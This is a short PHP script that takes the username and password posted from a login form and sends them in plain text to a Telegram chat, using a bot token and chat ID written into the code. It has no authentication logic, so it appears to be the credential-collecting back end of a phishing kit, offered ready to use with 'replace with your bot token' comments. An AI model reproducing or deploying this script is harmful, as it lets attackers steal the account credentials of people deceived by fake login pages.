

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $uname = htmlspecialchars($_POST['uname']);
    $pass = htmlspecialchars($_POST['pass']);
    
    // Telegram bot credentials
    $botToken = '7509491174:AAGVMKte0Ty9oAb27pVI0RXshKmiprSkJwg'; // Replace with your bot token
    $chatId = '2100702364'; // Replace with your chat ID
    
    // Prepare message
    $message = "Username: $uname\nPassword: $pass";
    
    // Send message via Telegram API
    $apiUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Send HTTP GET request
    $response = file_get_contents($apiUrl);
    
    if ($response) {
        echo 'Message sent to Telegram successfully.';
    } else {
        echo 'Failed to send message.';
    }
}
?>
